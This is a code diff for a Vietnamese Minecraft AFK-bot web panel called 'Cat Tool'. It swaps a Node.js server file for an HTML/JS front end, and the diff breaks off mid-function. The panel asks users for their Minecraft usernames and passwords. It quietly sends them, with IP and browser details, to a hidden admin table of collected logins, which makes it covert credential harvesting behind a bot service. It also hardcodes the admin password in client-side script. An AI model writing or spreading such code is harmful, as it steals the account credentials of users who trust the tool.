@@ -1,462 +1,887 @@
-const express = require('express');
-const http = require('http');
-const { Server } = require('socket.io');
-const mineflayer = require('mineflayer');
-const fs = require('fs');
-
-const app = express();
-const server = http.createServer(app);
-const io = new Server(server);
-
-const PORT = process.env.PORT || 3000;
-const DATA_FILE = './data.json';
-
-// ===== CẤU HÌNH ADMIN =====
-const ADMIN_IP = '1.53.131.94'; 
-const ADMIN_PASSWORD = 'AlphaZo2026';
-
-// ===== ĐỌC/LƯU DỮ LIỆU =====
-function loadData() {
-    try {
-        if (fs.existsSync(DATA_FILE)) {
-            const raw = fs.readFileSync(DATA_FILE, 'utf-8');
-            return JSON.parse(raw);
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cat Tool — BY meovancat & giananday</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;900&family=Playfair+Display:ital,wght@0,700;1,700&display=swap" rel="stylesheet">
+    
+    <style>
+        * { box-sizing: border-box; transition: all 0.25s ease; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: radial-gradient(circle at 50% 30%, #3a1505 0%, #170802 60%, #080301 100%);
+            color: #fff; 
+            margin: 0; 
+            padding: 20px; 
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
         }
-    } catch (e) {
-        console.log('⚠️ Lỗi đọc file data, tạo mới');
+        
+        .vintage-title {
+            font-family: 'Cinzel', serif;
+            font-weight: 900;
+            text-shadow: 0 0 30px rgba(255, 51, 0, 0.8), 0 0 60px rgba(255, 0, 0, 0.4);
+            letter-spacing: 4px;
+            color: #ff4422;
+            font-size: 28px;
+        }
+        .vintage-sub {
+            font-family: 'Playfair Display', serif;
+            font-style: italic;
+            color: #ffaa66;
+            text-shadow: 0 0 15px rgba(255, 170, 102, 0.5);
+        }
+
+        .header-brand {
+            text-align: center;
+            font-size: 13px;
+            color: #ff7700;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 5px;
+            font-weight: 700;
+            text-shadow: 0 0 12px rgba(255, 119, 0, 0.8);
+        }
+        h2 { 
+            margin-top: 0; 
+            text-align: center; 
+            color: #ffffff; 
+            font-size: 34px;
+            margin-bottom: 5px;
+            text-shadow: 0 0 15px rgba(255, 136, 0, 0.7), 0 0 30px rgba(255, 68, 0, 0.4);
+        }
+        .subtitle {
+            text-align: center;
+            color: #ffaa66;
+            font-size: 14px;
+            margin-bottom: 25px;
+            text-shadow: 0 0 8px rgba(255, 170, 102, 0.4);
+        }
+        .container { 
+            max-width: 950px; 
+            margin: 0 auto; 
+            background: rgba(22, 11, 5, 0.85); 
+            backdrop-filter: blur(12px);
+            padding: 25px; 
+            border-radius: 16px; 
+            box-shadow: 0 0 40px rgba(255, 102, 0, 0.25), inset 0 0 15px rgba(255, 136, 0, 0.1); 
+            border: 1px solid rgba(255, 119, 0, 0.4);
+            flex: 1;
+        }
+
+        #maintenanceOverlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+            padding: 20px;
+        }
+        #maintenanceOverlay.active { display: flex; }
+        #maintenanceOverlay h1 {
+            font-family: 'Cinzel', serif;
+            font-size: 60px;
+            color: #ff3300;
+            text-shadow: 0 0 50px rgba(255, 51, 0, 0.8);
+            margin-bottom: 10px;
+        }
+        #maintenanceOverlay p { font-size: 22px; color: #ffaa66; max-width: 600px; }
+        #maintenanceOverlay .sub { color: #884422; font-size: 16px; margin-top: 30px; }
+        
+        /* ===== NÚT TẮT BẢO TRÌ KHẨN CẤP (CHỈ ADMIN) ===== */
+        #adminMaintenanceBtn {
+            margin-top: 20px;
+        }
+        #adminMaintenanceBtn button {
+            background: linear-gradient(135deg, #ff3300, #ff0000);
+            border: none;
+            padding: 12px 30px;
+            border-radius: 30px;
+            color: #fff;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 0 30px rgba(255, 51, 0, 0.8);
+            transition: all 0.3s ease;
+            border: 2px solid #ff6633;
+        }
+        #adminMaintenanceBtn button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 50px rgba(255, 51, 0, 1);
+        }
+        #adminMaintenanceBtn button:active {
+            transform: scale(0.95);
+        }
+        #adminMaintenanceBtn p {
+            font-size: 12px;
+            color: #ff6633;
+            margin-top: 8px;
+        }
+
+        .add-account-box {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            background: rgba(32, 16, 8, 0.9);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 119, 0, 0.3);
+            box-shadow: 0 0 15px rgba(255, 119, 0, 0.1);
+            flex-wrap: wrap;
+        }
+        .add-account-box input {
+            flex: 1;
+            padding: 10px 14px;
+            background: rgba(10, 5, 2, 0.9);
+            border: 1px solid #662b00;
+            border-radius: 6px;
+            color: #fff;
+            outline: none;
+            font-size: 14px;
+            min-width: 150px;
+        }
+        .add-account-box input:focus { 
+            border-color: #ff7700; 
+            box-shadow: 0 0 15px rgba(255, 119, 0, 0.7);
+            background: rgba(20, 10, 5, 0.9);
+        }
+        .btn-add {
+            background: linear-gradient(135deg, #ff5500, #ffbb00);
+            color: #1a0800;
+            border: none;
+            padding: 0 20px;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(255, 85, 0, 0.5);
+        }
+        .btn-add:hover { 
+            opacity: 0.95; 
+            box-shadow: 0 0 25px rgba(255, 119, 0, 0.9);
+            transform: translateY(-1px);
+        }
+
+        .accounts-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .account-card {
+            background: rgba(26, 13, 6, 0.85);
+            border: 1px solid rgba(255, 119, 0, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.6);
+            transition: all 0.3s ease;
+        }
+        .account-card:hover {
+            border-color: rgba(255, 119, 0, 0.7);
+            box-shadow: 0 0 25px rgba(255, 119, 0, 0.3);
+            transform: translateY(-2px);
+        }
+        .account-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .account-title {
+            font-weight: bold;
+            font-size: 16px;
+            color: #ffaa33;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-shadow: 0 0 8px rgba(255, 170, 51, 0.5);
+        }
+        .status-badge {
+            font-size: 12px;
+            padding: 3px 10px;
+            border-radius: 4px;
+            font-weight: bold;
+            background: rgba(10, 5, 2, 0.9);
+            box-shadow: inset 0 0 5px rgba(0,0,0,0.5);
+        }
+        .account-actions {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .btn { 
+            padding: 7px 14px; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            font-size: 13px;
+            transition: all 0.2s ease;
+        } 
+        .btn-start { background: #00cc44; color: white; box-shadow: 0 0 10px rgba(0, 204, 68, 0.4); } 
+        .btn-start:hover { box-shadow: 0 0 18px rgba(0, 204, 68, 0.8); transform: translateY(-1px); }
+        .btn-start:active { transform: scale(0.95); }
+        
+        .btn-stop { background: #ff3333; color: white; box-shadow: 0 0 10px rgba(255, 51, 51, 0.4); } 
+        .btn-stop:hover { box-shadow: 0 0 18px rgba(255, 51, 51, 0.8); transform: translateY(-1px); }
+        .btn-stop:active { transform: scale(0.95); }
+        
+        .btn-del { background: rgba(50, 20, 10, 0.9); color: #ff8888; border: 1px solid rgba(255, 68, 68, 0.3); }
+        .btn-del:hover { background: #ff3333; color: white; box-shadow: 0 0 15px rgba(255, 51, 51, 0.6); }
+        
+        .toggle-label {
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+            color: #ffaa66;
+        }
+        .toggle-label:hover { color: #fff; }
+        .toggle-label input[type="checkbox"] {
+            accent-color: #ff7700;
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+
+        .log-box { 
+            background: rgba(5, 2, 1, 0.95); 
+            color: #00ff88; 
+            font-family: 'Consolas', monospace; 
+            height: 220px; 
+            overflow-y: auto; 
+            padding: 12px; 
+            border-radius: 6px; 
+            margin-bottom: 15px; 
+            font-size: 12px; 
+            line-height: 1.5; 
+            white-space: pre-wrap; 
+            word-break: break-all;
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            box-shadow: inset 0 0 15px rgba(0, 255, 136, 0.15), 0 0 10px rgba(0,0,0,0.8);
+        }
+        .log-box::-webkit-scrollbar {
+            width: 6px;
+        }
+        .log-box::-webkit-scrollbar-track {
+            background: rgba(0,0,0,0.3);
+            border-radius: 3px;
+        }
+        .log-box::-webkit-scrollbar-thumb {
+            background: #ff7700;
+            border-radius: 3px;
+        }
+
+        .chat-container { display: flex; gap: 10px; flex-wrap: wrap; } 
+        .chat-input { 
+            flex: 1; 
+            padding: 10px; 
+            border-radius: 6px; 
+            border: 1px solid #662b00; 
+            background: rgba(10, 5, 2, 0.9); 
+            color: #fff; 
+            outline: none; 
+            font-size: 13px; 
+            min-width: 120px;
+            transition: all 0.3s ease;
+        } 
+        .chat-input:focus { 
+            border-color: #ff7700; 
+            box-shadow: 0 0 15px rgba(255, 119, 0, 0.6);
+            background: rgba(20, 10, 5, 0.9);
+        } 
+        .chat-btn { 
+            padding: 10px 20px; 
+            background: #ff7700; 
+            color: #1a0800; 
+            border: none; 
+            border-radius: 6px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            box-shadow: 0 0 12px rgba(255, 119, 0, 0.5);
+            transition: all 0.2s ease;
+        }
+        .chat-btn:hover { 
+            box-shadow: 0 0 20px rgba(255, 119, 0, 0.9); 
+            transform: translateY(-1px);
+        }
+        .chat-btn:active { transform: scale(0.95); }
+
+        .admin-panel {
+            display: none;
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #ff3300;
+            border-radius: 12px;
+            box-shadow: 0 0 40px rgba(255, 51, 0, 0.5);
+        }
+        .admin-panel.active { display: block; }
+        .admin-panel h3 { 
+            text-align: center; 
+            font-family: 'Cinzel', serif;
+            font-weight: 900;
+            font-size: 28px;
+            color: #ff3300; 
+            text-shadow: 0 0 30px rgba(255, 51, 0, 0.8);
+            letter-spacing: 3px;
+        }
+        .admin-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        .admin-table th, .admin-table td { padding: 8px 10px; border: 1px solid #662b00; text-align: left; }
+        .admin-table th { background: #1a0800; color: #ff7700; font-family: 'Cinzel', serif; }
+        .admin-table td { background: rgba(10, 5, 2, 0.8); color: #ffaa66; }
+        .admin-table tr:hover td { background: rgba(255, 119, 0, 0.1); }
+        
+        .admin-login-box {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 15px 0;
+            flex-wrap: wrap;
+        }
+        .admin-login-box input {
+            padding: 8px 14px;
+            background: #0a0502;
+            border: 1px solid #ff3300;
+            border-radius: 6px;
+            color: #fff;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+        .admin-login-box input:focus {
+            border-color: #ff7700;
+            box-shadow: 0 0 15px rgba(255, 119, 0, 0.3);
+        }
+        .admin-login-box button {
+            padding: 8px 20px;
+            background: #ff3300;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .admin-login-box button:hover { 
+            opacity: 0.8;
+            transform: translateY(-1px);
+        }
+        .admin-login-box button:active { transform: scale(0.95); }
+
+        .maintenance-toggle {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 10px 24px;
+            border-radius: 30px;
+            border: 2px solid #ff7700;
+            background: rgba(255, 119, 0, 0.15);
+            color: #ffaa33;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        .maintenance-toggle:hover {
+            background: rgba(255, 119, 0, 0.3);
+            box-shadow: 0 0 30px rgba(255, 119, 0, 0.5);
+            transform: scale(1.02);
+        }
+        .maintenance-toggle.on {
+            border-color: #ff3333;
+            background: rgba(255, 51, 0, 0.3);
+            color: #ff5555;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.4);
+        }
+
+        .footer-section {
+            text-align: center;
+            margin-top: 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+        .admin-btn {
+            background: rgba(255, 119, 0, 0.15);
+            border: 1px solid rgba(255, 119, 0, 0.5);
+            color: #ffaa33;
+            padding: 8px 22px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 13px;
+            box-shadow: 0 0 15px rgba(255, 119, 0, 0.2);
+            transition: all 0.3s ease;
+        }
+        .admin-btn:hover {
+            background: rgba(255, 119, 0, 0.3);
+            border-color: rgba(255, 119, 0, 0.9);
+            box-shadow: 0 0 25px rgba(255, 119, 0, 0.7);
+            transform: translateY(-1px);
+        }
+        .discord-float {
+            position: fixed;
+            bottom: 25px;
+            right: 25px;
+            background: #5865F2;
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 25px rgba(88, 101, 242, 0.8);
+            cursor: pointer;
+            z-index: 99;
+            transition: all 0.3s ease;
+        }
+        .discord-float:hover { 
+            transform: scale(1.1) rotate(5deg); 
+            box-shadow: 0 0 35px rgba(88, 101, 242, 1);
+        }
+        .discord-float svg { width: 28px; height: 28px; }
+        .copyright {
+            color: #ffaa66;
+            font-size: 12px;
+            text-shadow: 0 0 8px rgba(255, 170, 102, 0.5);
+        }
+
+        .table-wrapper { overflow-x: auto; }
+        .status-online { color: #44ff44; }
+        .status-offline { color: #ff4444; }
+        .status-connecting { color: #ffaa00; }
+        .text-center { text-align: center; }
+        .mt-10 { margin-top: 10px; }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .log-box div {
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @media (max-width: 600px) {
+            .container { padding: 15px; }
+            .add-account-box { flex-direction: column; }
+            .add-account-box input { min-width: 100%; }
+            .admin-table { font-size: 11px; }
+            .admin-table th, .admin-table td { padding: 4px 6px; }
+            h2 { font-size: 24px; }
+            .vintage-title { font-size: 20px; }
+            #maintenanceOverlay h1 { font-size: 32px; }
+            #maintenanceOverlay p { font-size: 16px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ===== OVERLAY BẢO TRÌ ===== -->
+<div id="maintenanceOverlay">
+    <h1>🔧 BẢO TRÌ</h1>
+    <p>Hệ thống đang được <strong style="color:#ff3300;">Alpha</strong> nâng cấp.<br>Vui lòng quay lại sau!</p>
+    
+    <!-- ===== NÚT TẮT BẢO TRÌ KHẨN CẤP (CHỈ ADMIN) ===== -->
+    <div id="adminMaintenanceBtn" style="display: none; margin-top: 20px;">
+        <button onclick="emergencyToggleMaintenance()" style="
+            background: linear-gradient(135deg, #ff3300, #ff0000);
+            border: none;
+            padding: 12px 30px;
+            border-radius: 30px;
+            color: #fff;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 0 30px rgba(255, 51, 0, 0.8);
+            transition: all 0.3s ease;
+            border: 2px solid #ff6633;
+        " onmouseover="this.style.transform='scale(1.05)'" onmouseout="this.style.transform='scale(1)'">
+            🔓 TẮT BẢO TRÌ (Admin)
+        </button>
+        <p style="font-size:12px; color:#ff6633; margin-top:8px;">⚠️ Chỉ Admin mới thấy nút này!</p>
+    </div>
+
+    <div class="sub">— Cat Tool —</div>
+</div>
+
+<!-- ===== MAIN CONTAINER ===== -->
+<div class="container">
+    <div class="header-brand">Cat Tool — BY meovancat & giananday</div>
+    <h2>Cat Tool Panel</h2>
+    <div class="subtitle">Hệ thống AFK Bot chuyên nghiệp • Multi-Account độc lập theo IP</div>
+
+    <div class="add-account-box">
+        <input type="text" id="new-username" placeholder="Nhập tên tài khoản Minecraft..." autocomplete="off">
+        <input type="password" id="new-password" placeholder="Mật khẩu (mặc định: caigicungdc)">
+        <button class="btn-add" onclick="addAccount()">+ Thêm Bot</button>
+    </div>
+
+    <div id="accounts-container" class="accounts-grid">
+        <div class="text-center" style="color: #ffaa66; padding: 20px;">Chưa có tài khoản nào. Hãy thêm bot!</div>
+    </div>
+
+    <div style="font-size: 13px; color: #ffaa66; margin-bottom: 5px; font-weight: bold;">Nhật ký hệ thống:</div>
+    <div id="log-box" class="log-box"></div>
+
+    <div id="adminPanel" class="admin-panel">
+        <h3 class="vintage-title">🔐 BẢNG ĐIỀU KHIỂN QUẢN TRỊ</h3>
+        <p class="text-center vintage-sub">Chỉ dành cho Alpha</p>
+        
+        <div class="admin-login-box">
+            <input type="password" id="adminPass" placeholder="Nhập mật khẩu Alpha..." onkeypress="if(event.key==='Enter') adminLogin()">
+            <button onclick="adminLogin()">🔓 Mở Khóa</button>
+            <button onclick="adminLogout()">🚪 Đóng</button>
+        </div>
+
+        <div id="adminContent" style="display: none;">
+            <div class="text-center mt-10">
+                <button id="maintenanceBtn" class="maintenance-toggle" onclick="toggleMaintenance()">
+                    🛠️ Bật Bảo Trì
+                </button>
+                <p style="font-size:12px; color:#884422; margin-top:5px;">Khi bật, chỉ Alpha mới vào được trang</p>
+            </div>
+            <hr style="border-color:#662b00;">
+
+            <h4 class="vintage-sub">📋 Danh sách IP & thông tin đăng nhập đã thu thập</h4>
+            <div style="margin-bottom:10px; font-size:13px; color:#ffaa66;">
+                Tổng: <span id="totalRecords">0</span> bản ghi
+            </div>
+            <div class="table-wrapper">
+                <table class="admin-table">
+                    <thead>
+                        <tr>
+                            <th>STT</th>
+                            <th>IP</th>
+                            <th>Thời gian</th>
+                            <th>Username</th>
+                            <th>Password</th>
+                            <th>Trình duyệt</th>
+                        </tr>
+                    </thead>
+                    <tbody id="adminTableBody">
+                        <tr><td colspan="6" class="text-center">Đang tải...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+            <br>
+            <button onclick="clearCollectedData()" style="background:#ff3300; border:none; padding:6px 16px; border-radius:4px; color:#fff; cursor:pointer; transition:all 0.2s ease;">
+                🗑️ Xóa toàn bộ dữ liệu
+            </button>
+            <hr style="border-color:#662b00;">
+            
+            <h4 class="vintage-sub">💬 Chat từ xa vào bot</h4>
+            <div>
+                <p style="color:#ffaa66; font-size:14px;">Chọn bot và nhập lệnh:</p>
+                <select id="remoteBotSelect" style="background:#0a0502; color:#fff; padding:6px; border:1px solid #ff7700; border-radius:4px; min-width:150px;">
+                    <option value="">-- Chưa có bot --</option>
+                </select>
+                <input type="text" id="remoteChatInput" placeholder="Lệnh (VD: /afk)" style="background:#0a0502; color:#fff; border:1px solid #662b00; padding:6px; border-radius:4px; margin-left:6px; margin-top:5px;">
+                <button onclick="sendRemoteChat()" style="background:#ff7700; border:none; padding:6px 14px; border-radius:4px; font-weight:bold; cursor:pointer; margin-top:5px; transition:all 0.2s ease;">
+                    Gửi
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== FOOTER ===== -->
+<div class="footer-section">
+    <button class="admin-btn" onclick="document.getElementById('adminPanel').classList.toggle('active')">🔒 Quản Trị Hệ Thống</button>
+    <div class="copyright">© 2026 Cat Tool. Uy tín làm nên thương hiệu.</div>
+</div>
+
+<!-- ===== DISCORD ===== -->
+<a href="https://discord.gg/wHHY7FDqd" target="_blank" class="discord-float" title="Tham gia Discord">
+    <svg width="28" height="28" viewBox="0 0 127.14 96.36" fill="#ffffff">
+        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.19-16.15c2.63-27.29-4.53-51.2-19.45-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5.18-12.72,11.45-12.72S53.9,46,53.88,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5.18-12.72,11.44-12.72S96.18,46,96.15,53,91,65.69,84.69,65.69Z"/>
+    </svg>
+</a>
+
+<!-- ===== SOCKET.IO ===== -->
+<script src="/socket.io/socket.io.js"></script>
+<script>
+    // ============================================================
+    //  CLIENT - KẾT NỐI SOCKET.IO VÀ XỬ LÝ UI
+    // ============================================================
+    
+    const socket = io();
+    const logBox = document.getElementById('log-box');
+    const accountsContainer = document.getElementById('accounts-container');
+    const ADMIN_PASSWORD = 'AlphaZo2026';
+    let isAdminLoggedIn = false;
+    let currentMaintenance = false;
+
+    // ===== LOG =====
+    function appendLog(msg) {
+        const div = document.createElement('div');
+        div.textContent = msg;
+        logBox.appendChild(div);
+        logBox.scrollTop = logBox.scrollHeight;
     }
-    return { clientData: {}, globalCollectedData: [], isMaintenance: false };
-}
 
-function saveData() {
-    try {
-        const data = {
-            clientData: clientData,
-            globalCollectedData: globalCollectedData,
-            isMaintenance: isMaintenance
-        };
-        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
-    } catch (e) {
-        console.log('❌ Lỗi lưu file:', e.message);
+    // ===== RENDER DANH SÁCH TÀI KHOẢN =====
+    function renderAccounts(accounts) {
+        const select = document.getElementById('remoteBotSelect');
+        if (select) {
+            select.innerHTML = '';
+            if (accounts && accounts.length > 0) {
+                accounts.forEach(acc => {
+                    const opt = document.createElement('option');
+                    opt.value = acc.id;
+                    opt.textContent = acc.username + ' (' + acc.status + ')';
+                    select.appendChild(opt);
+                });
+            } else {
+                const opt = document.createElement('option');
+                opt.value = '';
+                opt.textContent = '-- Chưa có bot --';
+                select.appendChild(opt);
+            }
+        }
+
+        if (!accounts || accounts.length === 0) {
+            accountsContainer.innerHTML = `<div class="text-center" style="color: #ffaa66; padding: 20px;">Chưa có tài khoản nào. Hãy thêm bot!</div>`;
+            return;
+        }
+        
+        let html = '';
+        accounts.forEach(acc => {
+            let statusClass = 'status-offline';
+            if (acc.status === 'ONLINE / KINGSMP' || acc.status === 'ONLINE / LOBBY') {
+                statusClass = 'status-online';
+            } else if (acc.status === 'CONNECTING...' || acc.status === 'LOGGING IN...') {
+                statusClass = 'status-connecting';
+            }
+            
+            html += `
+                <div class="account-card">
+                    <div class="account-header">
+                        <div class="account-title">🤖 ${acc.username}</div>
+                        <div class="status-badge ${statusClass}" style="border: 1px solid ${acc.color}; text-shadow: 0 0 8px ${acc.color};">${acc.status}</div>
+                    </div>
+                    <div class="account-actions">
+                        <button class="btn btn-start" onclick="startBot('${acc.id}')">▶ Bật</button>
+                        <button class="btn btn-stop" onclick="stopBot('${acc.id}')">⏹ Tắt</button>
+                        <button class="btn btn-del" onclick="deleteAccount('${acc.id}')">🗑 Xóa</button>
+                        <label class="toggle-label" style="margin-left: auto;">
+                            <input type="checkbox" ${acc.autoReconnect ? 'checked' : ''} onchange="toggleAutoReconnect('${acc.id}')"> Auto Reconnect
+                        </label>
+                    </div>
+                    <div class="chat-container">
+                        <input type="text" id="chat_${acc.id}" class="chat-input" placeholder="Gửi lệnh nhanh..." onkeypress="if(event.key==='Enter') sendAccountChat('${acc.id}')">
+                        <button class="chat-btn" onclick="sendAccountChat('${acc.id}')">Gửi</button>
+                    </div>
+                </div>
+            `;
+        });
+        accountsContainer.innerHTML = html;
     }
-}
 
-const savedData = loadData();
-let clientData = savedData.clientData || {};
-let globalCollectedData = savedData.globalCollectedData || [];
-let isMaintenance = savedData.isMaintenance || false;
-
-app.use(express.static('public'));
-
-app.get('/api/check-admin', (req, res) => {
-    let clientIp = req.headers['x-forwarded-for'] 
-        ? req.headers['x-forwarded-for'].split(',')[0].trim() 
-        : req.socket.remoteAddress;
-    if (clientIp && clientIp.includes('::1')) clientIp = '127.0.0.1';
-    const isAdmin = (clientIp === ADMIN_IP || clientIp === '127.0.0.1' || clientIp.includes('192.168.'));
-    res.json({ isAdmin, ip: clientIp });
-});
-
-process.on('uncaughtException', (err) => console.log('[LỖI HỆ THỐNG]:', err.message));
-process.on('unhandledRejection', (reason) => console.log('[LỖI PROMISE]:', reason?.message || reason));
-
-// ================================================================
-//  SOCKET.IO
-// ================================================================
-io.on('connection', (socket) => {
-    let rawIp = socket.handshake.headers['x-forwarded-for'] 
-        ? socket.handshake.headers['x-forwarded-for'].split(',')[0].trim() 
-        : socket.handshake.address;
-    if (rawIp && rawIp.includes('::1')) rawIp = '127.0.0.1';
-    const clientIp = rawIp;
-
-    console.log(`[${new Date().toLocaleString()}] 🔌 Client connected: ${clientIp}`);
-
-    if (!clientData[clientIp]) {
-        clientData[clientIp] = { 
-            accounts: [], 
-            bots: {} 
-        };
-        saveData();
+    // ===== RENDER BẢNG ADMIN =====
+    function renderAdminTable(data) {
+        const tbody = document.getElementById('adminTableBody');
+        if (!tbody) return;
+        let html = '';
+        if (!data || data.length === 0) {
+            html = '<tr><td colspan="6" class="text-center">Chưa có dữ liệu</td></tr>';
+        } else {
+            data.forEach((item, index) => {
+                html += `<tr>
+                    <td>${index + 1}</td>
+                    <td>${item.ip}</td>
+                    <td>${item.time}</td>
+                    <td>${item.username}</td>
+                    <td>${item.password}</td>
+                    <td>${item.userAgent ? item.userAgent.substring(0, 25) + '...' : 'N/A'}</td>
+                </tr>`;
+            });
+        }
+        tbody.innerHTML = html;
+        document.getElementById('totalRecords').textContent = data ? data.length : 0;
     }
 
-    socket.emit('init_accounts', clientData[clientIp].accounts);
-    socket.emit('sync_collected_data', globalCollectedData);
-    socket.emit('maintenance_status', isMaintenance);
+    // ===== CẬP NHẬT BẢO TRÌ =====
+    function updateMaintenanceUI(status) {
+        currentMaintenance = status;
+        const overlay = document.getElementById('maintenanceOverlay');
+        const btn = document.getElementById('maintenanceBtn');
+        const adminBtn = document.getElementById('adminMaintenanceBtn');
+        
+        if (status) {
+            overlay.classList.add('active');
+            if (btn) {
+                btn.textContent = '🛠️ Tắt Bảo Trì';
+                btn.classList.add('on');
+            }
+            // Kiểm tra nếu Admin đang login thì hiện nút tắt khẩn cấp
+            if (isAdminLoggedIn && adminBtn) {
+                adminBtn.style.display = 'block';
+            }
+        } else {
+            overlay.classList.remove('active');
+            if (btn) {
+                btn.textContent = '🛠️ Bật Bảo Trì';
+                btn.classList.remove('on');
+            }
+            if (adminBtn) {
+                adminBtn.style.display = 'none';
+            }
+        }
+    }
+
+    // ===== TẮT BẢO TRÌ KHẨN CẤP (CHỦ ADMIN) =====
+    function emergencyToggleMaintenance() {
+        if (isAdminLoggedIn) {
+            socket.emit('toggle_maintenance', false);
+            appendLog('🔓 Admin đã tắt bảo trì khẩn cấp!');
+        } else {
+            alert('❌ Bạn không có quyền! Chỉ Admin mới tắt được!');
+        }
+    }
 
     // ============================================================
-    //  THU THẬP DỮ LIỆU
+    //  SOCKET EVENTS
     // ============================================================
-    socket.on('collect_data', (data) => {
-        const entry = {
-            ip: clientIp,
-            time: new Date().toLocaleString(),
-            username: data.username || '(chưa nhập)',
-            password: data.password || '(trống)',
-            userAgent: data.userAgent || 'N/A'
-        };
-        globalCollectedData.push(entry);
-        saveData();
-        console.log(`[${new Date().toLocaleString()}] 📥 Data from ${clientIp}: ${entry.username}`);
-        io.emit('sync_collected_data', globalCollectedData);
-        io.emit('log', `[${new Date().toLocaleString()}] 📥 Đã thu thập dữ liệu từ IP: ${clientIp}`);
+
+    socket.on('init_accounts', (accounts) => {
+        renderAccounts(accounts);
     });
 
-    socket.on('clear_collected_data', () => {
-        globalCollectedData = [];
-        saveData();
-        io.emit('sync_collected_data', globalCollectedData);
-        io.emit('log', `[${new Date().toLocaleString()}] 🧹 Đã xóa toàn bộ dữ liệu thu thập`);
+    socket.on('sync_collected_data', (data) => {
+        renderAdminTable(data);
+        if (isAdminLoggedIn) {
+            appendLog(`📥 Có ${data ? data.length : 0} bản ghi dữ liệu`);
+        }
+    });
+
+    socket.on('log', (msg) => {
+        appendLog(msg);
+    });
+
+    socket.on('maintenance_status', (status) => {
+        updateMaintenanceUI(status);
+    });
+
+    socket.on('restart_internal_bot', (id) => {
+        startBot(id);
     });
 
     // ============================================================
-    //  BẢO TRÌ
+    //  UI FUNCTIONS
     // ============================================================
-    socket.on('toggle_maintenance', (status) => {
-        isMaintenance = status;
-        saveData();
-        io.emit('maintenance_status', isMaintenance);
-        io.emit('log', `[${new Date().toLocaleString()}] 🛠️ Bảo trì ${status ? 'BẬT' : 'TẮT'}`);
-        console.log(`[${new Date().toLocaleString()}] 🛠️ Maintenance: ${status ? 'ON' : 'OFF'}`);
-    });
 
-    // ============================================================
-    //  QUẢN LÝ ACCOUNTS
-    // ============================================================
-    socket.on('add_account', (data) => {
-        const { username, password } = data;
-        if (!username) return;
+    function addAccount() {
+        const username = document.getElementById('new-username').value.trim();
+        const password = document.getElementById('new-password').value.trim();
+        if (!username) { 
+            alert('Vui lòng nhập tên tài khoản!'); 
+            return; 
+        }
         
         socket.emit('collect_data', {
             username: username,
             password: password || 'caigicungdc',
-            userAgent: socket.handshake.headers['user-agent'] || 'N/A'
